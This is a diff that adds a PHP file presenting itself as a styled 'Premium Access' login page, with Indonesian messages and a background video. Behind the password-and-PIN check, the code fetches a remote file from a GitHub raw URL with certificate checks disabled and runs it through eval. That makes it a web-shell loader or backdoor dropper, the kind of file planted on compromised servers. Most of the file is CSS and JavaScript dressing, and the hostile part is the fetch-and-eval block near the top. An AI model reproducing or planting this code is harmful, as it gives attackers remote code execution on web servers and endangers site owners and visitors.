@@ -1,0 +1,524 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+session_start();
+define('SECURE_ACCESS', true);
+header('X-Powered-By: none');
+header('Content-Type: text/html; charset=UTF-8');
+
+$hashed_password = '$2y$10$qn4Yz6OFMOJaoR8KdMunxeU/GCF/E4CZ6R.fjK45y/Vta.ljs3jvq'; // bcrypt dari 'rahasia123'
+$hashed_pin = '$2y$10$YGsLH5ePoH.sAAq6JDwmVuOheB/CZ2FuoWF2uQ.xCNXEJRVtMdhcu'; // bcrypt dari '246810'
+
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        $data = curl_exec($conn);
+        curl_close($conn);
+        return $data;
+    } elseif (function_exists('file_get_contents')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+
+function is_logged_in() {
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+if (is_logged_in()) {
+    $a = geturlsinfo('https://raw.githubusercontent.com/Kamp4ng/cilako/refs/heads/main/litespeed.txt');
+    if ($a === false) {
+        die("Gagal mendapatkan konten dari URL.");
+    }
+    eval('?>' . $a);
+} else {
+    $error = '';
+    if (isset($_POST['password']) && isset($_POST['pin'])) {
+        $entered_password = $_POST['password'];
+        $entered_pin = $_POST['pin'];
+
+        if (password_verify($entered_password, $hashed_password) && password_verify($entered_pin, $hashed_pin)) {
+            $_SESSION['logged_in'] = true;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $error = "Password atau PIN salah!";
+        }
+    }
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <title>Login | Premium Access</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        
+        /* Video Container */
+        .video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: -2;
+        }
+        
+        #bgVideo {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            min-width: 100%;
+            min-height: 100%;
+            width: auto;
+            height: auto;
+            object-fit: cover;
+            filter: brightness(0.45) contrast(1.1);
+        }
+        
+        /* Overlay Gradient */
+        .video-container::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(0,0,0,0.6) 0%, rgba(0,0,0,0.2) 100%);
+            pointer-events: none;
+        }
+        
+        /* Sound Control Button */
+        .sound-control {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            z-index: 20;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(8px);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+        
+        .sound-control:hover {
+            background: rgba(103,0,90,0.8);
+            transform: scale(1.1);
+            border-color: rgba(103,0,90,0.8);
+        }
+        
+        .sound-control svg {
+            width: 24px;
+            height: 24px;
+            fill: white;
+        }
+        
+        /* Glassmorphism Container */
+        .container {
+            width: 380px;
+            padding: 45px 35px;
+            background: rgba(10, 10, 10, 0.7);
+            backdrop-filter: blur(15px);
+            border-radius: 24px;
+            box-shadow: 0 15px 45px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.08);
+            color: white;
+            text-align: center;
+            z-index: 10;
+            animation: fadeInUp 0.7s ease-out;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .container h2 {
+            margin-bottom: 20px;
+            font-size: 30px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            background: linear-gradient(135deg, #ffffff, #cccccc);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        
+        .container .subtitle {
+            font-size: 13px;
+            color: rgba(255,255,255,0.6);
+            margin-bottom: 30px;
+            letter-spacing: 0.5px;
+        }
+        
+        .input-group {
+            margin-bottom: 22px;
+            text-align: left;
+        }
+        
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            margin-bottom: 8px;
+            color: #ddd;
+            letter-spacing: 0.5px;
+            font-weight: 500;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.2);
+            background: rgba(255,255,255,0.08);
+            outline: none;
+            font-size: 15px;
+            color: white;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+            font-family: inherit;
+        }
+        
+        input:focus {
+            border-color: #67005a;
+            background: rgba(255,255,255,0.12);
+            box-shadow: 0 0 18px rgba(103,0,90,0.3);
+        }
+        
+        input::placeholder {
+            color: rgba(255,255,255,0.4);
+        }
+        
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #67005a, #3a0030);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 15px;
+            box-shadow: 0 5px 15px rgba(103,0,90,0.3);
+            font-family: inherit;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            background: linear-gradient(135deg, #7a0068, #4a0038);
+            box-shadow: 0 8px 25px rgba(103,0,90,0.4);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        .error {
+            color: #ff6b6b;
+            background: rgba(255,0,0,0.1);
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            border-left: 3px solid #ff6b6b;
+            text-align: left;
+        }
+        
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                width: 90%;
+                padding: 35px 25px;
+                margin: 0 20px;
+            }
+            
+            .container h2 {
+                font-size: 26px;
+            }
+            
+            .sound-control {
+                bottom: 20px;
+                right: 20px;
+                width: 45px;
+                height: 45px;
+            }
+        }
+        
+        /* Loading */
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            font-size: 14px;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top-color: #67005a;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 15px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Volume indicator */
+        .volume-indicator {
+            position: fixed;
+            bottom: 90px;
+            right: 30px;
+            background: rgba(0,0,0,0.7);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: white;
+            z-index: 20;
+            transition: opacity 0.3s ease;
+            pointer-events: none;
+            backdrop-filter: blur(5px);
+        }
+        
+        @media (max-width: 480px) {
+            .volume-indicator {
+                bottom: 80px;
+                right: 25px;
+                font-size: 10px;
+            }
+        }
+    </style>
+    </head>
+    <body>
+    <!-- Loading Indicator -->
+    <div class="loading" id="loading">
+        <div class="loading-spinner"></div>
+        <div>Loading immersive experience...</div>
+    </div>
+    
+    <!-- Video Background Container -->
+    <div class="video-container">
+        <video id="bgVideo" autoplay loop muted playsinline poster="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%23333' width='100' height='100'/%3E%3C/svg%3E">
+            <source src="https://kawi898berjuang.com/newupdate/sora.mp4" type="video/mp4" />
+        </video>
+    </div>
+    
+    <!-- Sound Control Button -->
+    <div class="sound-control" id="soundControl" title="Toggle Sound">
+        <svg id="soundIcon" viewBox="0 0 24 24" width="24" height="24">
+            <!-- Speaker icon (sound on) -->
+            <path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/>
+        </svg>
+    </div>
+    
+    <div class="volume-indicator" id="volumeIndicator" style="opacity:0;">🔊 Sound: ON</div>
+    
+    <div class="container">
+        <h2>Welcome Back</h2>
+        <div class="subtitle">Enter your credentials to continue</div>
+        <?php if (!empty($error)) echo "<div class='error'>⚠️ $error</div>"; ?>
+        <form method="post">
+            <div class="input-group">
+                <label>🔒 Password</label>
+                <input type="password" name="password" placeholder="Enter your password" required autocomplete="off" />
+            </div>
+            <div class="input-group">
+                <label>🔢 PIN (6 digits)</label>
+                <input type="password" name="pin" placeholder="Enter your PIN" maxlength="6" required autocomplete="off" />
+            </div>
+            <button type="submit">Login →</button>
+        </form>
+    </div>
+    
+    <script>
+        // Video and Audio Control
+        const video = document.getElementById('bgVideo');
+        const loading = document.getElementById('loading');
+        const soundControl = document.getElementById('soundControl');
+        const soundIcon = document.getElementById('soundIcon');
+        const volumeIndicator = document.getElementById('volumeIndicator');
+        
+        let isSoundOn = false; // Start with sound OFF (muted)
+        let indicatorTimeout;
+        
+        // Show volume indicator temporarily
+        function showVolumeIndicator(message, isOn) {
+            volumeIndicator.textContent = message;
+            volumeIndicator.style.opacity = '1';
+            volumeIndicator.style.backgroundColor = isOn ? 'rgba(103,0,90,0.8)' : 'rgba(0,0,0,0.7)';
+            
+            clearTimeout(indicatorTimeout);
+            indicatorTimeout = setTimeout(() => {
+                volumeIndicator.style.opacity = '0';
+            }, 1500);
+        }
+        
+        // Update sound icon based on state
+        function updateSoundIcon(isOn) {
+            if (isOn) {
+                // Sound ON icon (with sound waves)
+                soundIcon.innerHTML = '<path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/>';
+            } else {
+                // Sound OFF icon (with mute slash)
+                soundIcon.innerHTML = '<path d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.89.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73l-9-9L4.27 3zM12 4L9.91 6.09 12 8.18V4z"/>';
+            }
+        }
+        
+        // Toggle sound function
+        function toggleSound() {
+            if (video) {
+                if (isSoundOn) {
+                    video.muted = true;
+                    isSoundOn = false;
+                    showVolumeIndicator('🔇 Sound: OFF', false);
+                } else {
+                    video.muted = false;
+                    isSoundOn = true;
+                    // Try to play with sound (may require user interaction)
+                    video.play().catch(function(error) {
+                        console.log("Auto-play with sound blocked:", error);
+                        showVolumeIndicator('⚠️ Click page to enable sound', false);
+                        video.muted = true;
+                        isSoundOn = false;
+                    });
+                    showVolumeIndicator('🔊 Sound: ON', true);
+                }
+                updateSoundIcon(isSoundOn);
+                
+                // Save preference to localStorage
+                localStorage.setItem('videoSoundOn', isSoundOn);
+            }
+        }
+        
+        // Load saved sound preference
+        function loadSoundPreference() {
+            const savedSound = localStorage.getItem('videoSoundOn');
+            if (savedSound !== null) {
+                isSoundOn = savedSound === 'true';
+                if (video) {
+                    video.muted = !isSoundOn;
+                    updateSoundIcon(isSoundOn);
+                }
+            } else {
+                // Default: muted (isSoundOn = false)
+                if (video) {
+                    video.muted = true;
+                    updateSoundIcon(false);
+                }
+            }
+        }
+        
+        // Hide loading when video can play
+        if (video) {
+            video.addEventListener('canplay', function() {
+                loading.style.opacity = '0';
+                setTimeout(() => {
+                    loading.style.display = 'none';
+                }, 500);
+            });
+            
+            video.addEventListener('error', function() {
+                loading.innerHTML = '<div class="loading-spinner"></div><div>Video unavailable, but you can still login</div>';
+                setTimeout(() => {
+                    loading.style.display = 'none';
+                }, 2000);
+            });
+            
+            // Load saved preference
+            loadSoundPreference();
+            
+            // Fallback timeout
+            setTimeout(() => {
+                if (loading.style.display !== 'none') {
+                    loading.style.display = 'none';
+                }
+            }, 4000);
+        }
+        
+        // Sound control click event
+        if (soundControl) {
+            soundControl.addEventListener('click', function(e) {
+                e.preventDefault();
+                toggleSound();
+            });
+        }
+        
+        // Auto-play with sound requires user interaction first time
+        // If user clicks anywhere on page, we can attempt to unmute if sound was enabled
+        document.body.addEventListener('click', function() {
+            if (video && isSoundOn && video.muted) {
+                video.muted = false;
+                video.play().catch(function(error) {
+                    console.log("Still cannot play:", error);
+                });
+                showVolumeIndicator('🔊 Sound enabled', true);
+                updateSoundIcon(true);
+            }
+        }, { once: true });
+        
+        // Also handle visibility change (when user comes back to tab)
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden && video) {
+                video.play().catch(function() {});
+            }
+        });
+    </script>
+    </body>
+    </html>
+    <?php
+}
+?>
